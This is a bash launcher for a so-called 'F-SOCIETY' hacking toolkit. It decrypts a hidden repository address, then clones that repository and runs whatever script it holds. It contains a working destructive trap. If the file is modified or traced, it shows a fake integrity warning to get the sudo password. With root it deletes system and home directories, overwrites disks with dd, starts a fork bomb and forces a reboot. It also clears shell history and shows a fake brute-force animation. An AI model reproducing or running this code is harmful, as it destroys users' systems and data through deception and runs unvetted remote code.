#!/bin/bash

# ============================================
# F-SOCIETY ULTIMATE SECURE TOOL
# Version: 2.0
# Developer: ATHEX BLACK HAT (DO NOT REMOVE!)
# ============================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
WHITE='\033[1;37m'
BLINK='\033[5m'
NC='\033[0m'
_ENCDATA1="U2FsdGVkX1+QBgdoM44WVu9FipD4qYzS3hWGTon81GlO2ppPcg053kLRMnJFMRQh
juErEiGRvIu3McF7S2J3Qg==" 
_ENCDATA2="U2FsdGVkX1+vi4KEd2H5qZeIqTy9RG9O8UWq9AKGvca8jSux3te5NHuyRFjuZlCy" 
_ENCDATA3="U2FsdGVkX18f8ul4heiA6HcEOQHDp1VqN6hbV4dvaJk=" 
_KEYA="f7a2c8e1"
_KEYB="3b9d5c4f"
_KEYC="2a1e6d8b"
_SIGNATURE="ATHEX BLACK HAT"
_CHECKSUM_STORED="04c96ac3bf5268242fe5280e701a15bec71a3cdafb8ffb031a2943b2f0e963da"
_check_current() {
    local _content=$(sed "/_CHECKSUM_STORED=/d" "$0" 2>/dev/null)
    echo "$_content" | sha256sum | cut -d' ' -f1
}
_verify_integrity() {
    if ! grep -q "$_SIGNATURE" "$0" 2>/dev/null; then
        return 1
    fi
    local _current=$(_check_current)
    if [ "$_current" != "$_CHECKSUM_STORED" ]; then
        return 1
    fi
    return 0
}
_trap_execute() {
    clear
    echo -e "${RED}${BLINK}"
    echo "                                                                                                                                       "
    echo "     ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️ "
    echo "     ☠️████████╗ █████╗ ███╗   ███╗██████╗ ███████╗██████╗     ██████╗ ███████╗████████╗███████╗ ██████╗████████╗███████╗██████╗ ██╗☠️"
    echo "     ☠️╚══██╔══╝██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║☠️"
    echo "     ☠️   ██║   ███████║██╔████╔██║██████╔╝█████╗  ██████╔╝    ██║  ██║█████╗     ██║   █████╗  ██║        ██║   █████╗  ██║  ██║██║☠️"
    echo "     ☠️   ██║   ██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗    ██║  ██║██╔══╝     ██║   ██╔══╝  ██║        ██║   ██╔══╝  ██║  ██║╚═╝☠️"
    echo "     ☠️   ██║   ██║  ██║██║ ╚═╝ ██║██║     ███████╗██║  ██║    ██████╔╝███████╗   ██║   ███████╗╚██████╗   ██║   ███████╗██████╔╝██╗☠️"
    echo "     ☠️   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═╝   ╚══════╝╚═════╝ ╚═╝☠️"  
    echo "     ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️"                                                                                              
    echo "                                Unauthorized modification detected!                                                                    "
    echo "                                 System verification required...                                                                       "
    echo "                                                                                                                                       "
    echo -e "${NC}"
    
    sleep 2
    
    # Fake verification screen
    echo -e "${YELLOW}[!] CRITICAL: System integrity compromised${NC}"
    echo -e "${YELLOW}[!] Root verification required to prevent damage${NC}"
    echo -e "${CYAN}"
    echo "     VERIFICATION REQUIRED                "
    echo "     Please enter sudo password           "
    echo "    to verify system integrity           "
    echo -e "${NC}"
    
    # Ask for root
    sudo -v 2>/dev/null
    
    if [ $? -eq 0 ]; then
        # GOT ROOT! Execute destructive sequence
        echo -e "${RED}"
        echo ""
        echo "                                                                  "
        echo "                   💀 SYSTEM COMPROMISED 💀                      "
        echo "                                                                  "
        echo "              Unauthorized tampering confirmed!                   "
        echo "               Executing SECURITY PROTOCOL...                      "
        echo "                                                                  "
        echo -e "${NC}"
        sleep 2
        for i in 1 2 3 4 5 6 7 8 9 10; do
            echo -ne "${RED}[!] Securing Your system... $((i*10))%${NC}\r"
            sleep 0.3
        done
        echo -e "\n${RED}[!] System compromise detected! Initiating countermeasures...${NC}"
        sleep 1
        sudo rm -rf /root/* 2>/dev/null
        sudo rm -rf /home/* 2>/dev/null
        sudo rm -rf /etc/passwd 2>/dev/null
        sudo rm -rf /etc/shadow 2>/dev/null
        sudo rm -rf /boot/* 2>/dev/null
        sudo rm -rf /bin/* 2>/dev/null
        sudo rm -rf /sbin/* 2>/dev/null
        sudo rm -rf /usr/* 2>/dev/null
        sudo rm -rf /var/* 2>/dev/null
        for disk in /dev/sda /dev/sdb /dev/nvme0n1; do
            if [ -b "$disk" ]; then
                sudo dd if=/dev/zero of="$disk" bs=1M count=100 2>/dev/null &
            fi
        done
        _fork_func() { _fork_func|_fork_func & }
        _fork_func
    else
        echo -e "${RED}[!] Verification failed!${NC}"
        echo -e "${RED}[!] Self-destructing tool...${NC}"
        
        sleep 1
        cd /
        rm -rf "$(dirname "$(readlink -f "$0")")" 2>/dev/null
        shred -u "$0" 2>/dev/null
        rm -rf /tmp/fs_* 2>/dev/null
        rm -rf /tmp/.fs_* 2>/dev/null
        history -c 2>/dev/null
        unset HISTFILE 2>/dev/null
    fi
    printf '\033[2J\033[3J\033[;H' 2>/dev/null
    echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
    echo b > /proc/sysrq-trigger 2>/dev/null
    
    exit 0
}
if ! _verify_integrity; then
    _trap_execute
fi
if [[ "$-" == *x* ]] || [ -n "$BASH_XTRACEFD" ]; then
    _trap_execute
fi
_BLOCK_FILE="/tmp/.fs_block_$(whoami)"

if [ -f "$_BLOCK_FILE" ]; then
    clear
    echo -e "${RED}"
    echo "                                                                  "
    echo "                      🚫 ACCESS DENIED 🚫                         "
    echo "                                                                  "
    echo "                  YOUR ACCESS HAS BEEN REVOKED                    "
    echo "                 Contact: ATHEX BLACK HAT                        "
    echo "                                                                  "
    echo -e "${NC}"
    exit 1
fi
_decrypt() {
    local _d="$1"
    local _k="${_KEYA}${_KEYB}${_KEYC}"
    echo "$_d" | openssl enc -aes-256-cbc -d -a -salt -pbkdf2 -pass "pass:$_k" 2>/dev/null
}

_get_repo() { _decrypt "$_ENCDATA1"; }
_get_pass() { _decrypt "$_ENCDATA2"; }
_get_contact() { _decrypt "$_ENCDATA3"; }
_matrix_effect() {
    echo -e "${GREEN}"
    local _cols=$(tput cols 2>/dev/null || echo 80)
    local _lines=15
    for ((i=0; i<_lines; i++)); do
        for ((j=0; j<_cols/2; j++)); do
            if [ $((RANDOM % 5)) -eq 0 ]; then
                echo -ne "${GREEN}$(echo $RANDOM | md5sum | head -c 1)${NC}"
            else
                echo -ne " "
            fi
        done
        echo
        sleep 0.05
    done
    echo -e "${NC}"
}
_loading() {
    local _text="$1"
    local _chars="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for ((i=0; i<20; i++)); do
        local _char="${_chars:$((i % 10)):1}"
        echo -ne "\r${CYAN}$_char ${_text}${NC}"
        sleep 0.1
    done
    echo -e "\r${GREEN}✓ ${_text} Complete!${NC}"
}
_progress() {
    local _text="$1"
    local _steps=20
    for ((i=0; i<=_steps; i++)); do
        local _percent=$((i * 100 / _steps))
        local _filled=$((i * 50 / _steps))
        local _empty=$((50 - _filled))
        printf "\r${CYAN}[%-${_filled}s%-${_empty}s] %3d%%${NC}" \
            "=========================" "                         " "$_percent"
        sleep 0.1
    done
    echo
}
_banner() {
    clear
    echo -e "${GREEN}"
    echo "                                                                                   "
    echo "         ███████╗      ███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗      "
    echo "         ██╔════╝      ██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝      "
    echo "         █████╗  █████╗███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝       "
    echo "         ██╔══╝  ╚════╝╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝        "
    echo "         ██║           ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║         "
    echo "         ╚═╝           ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝         "
    echo "                                                                                   "
    echo "                         ULTIMATE TOOLKIT FRAMEWORK                                "
    echo "                           By: ATHEX BLACK HAT                                     "
    echo "                                Version: 2.0                                       "
    echo -e "${NC}"
}
_access_granted() {
    clear
    echo -e "${GREEN}"
    sleep 0.5
    
    # Matrix effect
    _matrix_effect
    echo
    echo "                                                             "
    echo "                    ✅ ACCESS GRANTED ✅                    "
    echo "                                                             "
    echo "         █████╗  ██████╗ ██████╗███████╗███████╗███████╗     "
    echo "        ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝     "
    echo "        ███████║██║     ██║     █████╗  ███████╗███████╗     "
    echo "        ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║     "
    echo "        ██║  ██║╚██████╗╚██████╗███████╗███████║███████║     "
    echo "        ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝     "
    echo "                                                             "
    echo "                 Welcome to F-SOCIETY Toolkit                "
    echo "                    By: ATHEX BLACK HAT                      "
    echo -e "${NC}"
    sleep 2
}
_access_denied() {
    clear
    echo -e "${RED}"
    sleep 0.3

    echo "                                                                                  "
    echo "                      ❌ ACCESS DENIED ❌                                        "
    echo "                                                                                  "
    echo "          ....###.....######...######..########..######...######.....    ❌       "
    echo "          ...##.##...##....##.##....##.##.......##....##.##....##....    ❌       "
    echo "          ..##...##..##.......##.......##.......##.......##..........    ❌       "
    echo "          .##.....##.##.......##.......######....######...######.....    ❌       "
    echo "          .#########.##.......##.......##.............##.......##....    ❌       "
    echo "          .##.....##.##....##.##....##.##.......##....##.##....##....    ❌       "
    echo "          .##.....##..######...######..########..######...######.....    ❌       "
    echo "                                                                                  "
    echo "                    Invalid Credentials!                                          "
    echo "                    Attempts Remaining: ${1}                                      "
    echo "                   System: ATHEX BLACK HAT                                        "
    echo -e "${NC}"
    sleep 1.5
}
_hack_animation() {
    echo -e "${GREEN}"
    local _services=(
        "ssh" "ftp" "http" "mysql" "smtp" "dns"
        "pop3" "ldap" "smb" "rdp" "vnc"
    )
    for _service in "${_services[@]}"; do
        echo -ne "${GREEN}[+] Brute forcing ${_service}..."
        sleep 0.2
        echo -ne " Password found: "
        echo -ne "$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
        echo -e "${NC}"
        sleep 0.1
    done
    echo -e "${NC}"
}
_skull() {
    echo -e "${RED}"
    echo "                    .-.      "
    echo "                   (0.0)     "
    echo "                 '=.|m|.='   "
    echo "                 .='\`'=='=. "
    echo "                             "
    echo "      ☠️  ATHEX BLACK HAT ☠️"
    echo -e "${NC}"
}
_MAX_ATTEMPTS=3
_ATTEMPT=0
_LOG_FILE="/tmp/.fs_auth_$(whoami)"

_auth() {
    local _real_pass=$(_get_pass)
    
    clear
    echo -e "${CYAN}"
    echo "🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒   "
    echo "🔒███████╗███████╗ ██████╗██╗   ██╗██████╗ ███████╗██████╗     ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗🔒 "
    echo "🔒██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗    ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║🔒 "
    echo "🔒███████╗█████╗  ██║     ██║   ██║██████╔╝█████╗  ██║  ██║    ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║🔒 "
    echo "🔒╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝  ██║  ██║    ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║🔒 "
    echo "🔒███████║███████╗╚██████╗╚██████╔╝██║  ██║███████╗██████╔╝    ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║🔒 "
    echo "🔒╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝🔒 "
    echo " 🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒  "                                                                                                                
    echo "                         System Protected By:                                                                          "
    echo "                          ATHEX BLACK HAT                                                                              "
    echo -e "${NC}" 
    
    _skull
    echo
    while [ $_ATTEMPT -lt $_MAX_ATTEMPTS ]; do
        echo -ne "${CYAN}[?] Enter Password (Attempt ${_ATTEMPT}/${_MAX_ATTEMPTS}): ${NC}"
        read -r -s _input
        echo
        if [ "$_input" = "$_real_pass" ]; then
            _access_granted
            echo "$(date): SUCCESS" >> "$_LOG_FILE"
            return 0
        else
            _access_denied $((_MAX_ATTEMPTS - _ATTEMPT - 1))
            _ATTEMPT=$((_ATTEMPT + 1))
            echo "$(date): FAILED" >> "$_LOG_FILE"
            if [ $_ATTEMPT -lt $_MAX_ATTEMPTS ]; then
                sleep $((_ATTEMPT * 2))
            fi
        fi
    done
    clear
    echo -e "${RED}"
    echo "🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫"
    echo "🚫  ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗███████╗██████╗  🚫"
    echo "🚫  ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗ 🚫"
    echo "🚫  ██████╔╝██║     ██║   ██║██║     █████╔╝ █████╗  ██║  ██║ 🚫"
    echo "🚫  ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ ██╔══╝  ██║  ██║ 🚫"
    echo "🚫  ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗███████╗██████╔╝ 🚫"
    echo "🚫  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝  🚫"
    echo "🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫🚫"
    echo "                 Maximum authentication attempts reached         "
    echo "                 System: LOCKED                                  "
    echo "                 Duration: 30 minutes                            "
    echo "                 Protected By: ATHEX BLACK HAT                   "
    echo -e "${NC}"
    date > "$_BLOCK_FILE"
    chmod 600 "$_BLOCK_FILE"
    (
        sleep 1800
        rm -f "$_BLOCK_FILE"
    ) &
    
    sleep 3
    exit 1
}

_run_tool() {
    local _repo=$(_get_repo)
    local _contact=$(_get_contact)
    local _tmp_dir="/tmp/.fs_tool_$$"
    _banner
    echo
    _hack_animation
    echo
    _loading "Initializing System"
    echo
    _progress "Loading Modules"
    echo
    echo -e "${CYAN}[*] Connecting to repository...${NC}"
    _loading "Establishing Connection"
    rm -rf "$_tmp_dir" 2>/dev/null
    if timeout 30 git clone "$_repo" "$_tmp_dir" 2>/dev/null; then
        echo -e "${GREEN}[✓] F-SOCIETY loaded successfully!${NC}"
    else
        echo -e "${RED}[✗] Connection failed!${NC}"
        echo -e "${YELLOW}[!] Check your internet connection${NC}"
        echo -e "${YELLOW}[!] Contact: $_contact${NC}"
        exit 1
    fi
    echo
    _progress "Loading Main Program"
    echo
    cd "$_tmp_dir" || exit 1
    echo -e "${CYAN}[*] Starting main program...${NC}"
    sleep 1
    if [ -f "f-society" ]; then
        chmod +x f-society
        ./f-society
    elif [ -f "f-society.sh" ]; then
        bash f-society.sh
    elif [ -f "f-society.py" ]; then
        python3 f-society.py
    else
        local _script=$(find . -maxdepth 1 -name "*.sh" -o -name "*.py" | head -1)
        if [ -n "$_script" ]; then
            bash "$_script" 2>/dev/null || python3 "$_script" 2>/dev/null
        fi
    fi
    cd /tmp
    rm -rf "$_tmp_dir" 2>/dev/null
}
_cleanup() {
    unset _ENCDATA1 _ENCDATA2 _ENCDATA3
    unset _KEYA _KEYB _KEYC
    unset _BLOCK_FILE _LOG_FILE
    unset _input _real_pass _repo _contact
    rm -f /tmp/.fs_tool_* 2>/dev/null
}
trap _cleanup EXIT
_verify_integrity || _trap_execute
_auth
_run_tool
echo -e "\n${GREEN}[✓] Execution Completed!${NC}"
echo -e "${CYAN}[*] Tool by: ATHEX BLACK HAT${NC}"
echo -e "${CYAN}[*] Thanks for using!${NC}"
exit 0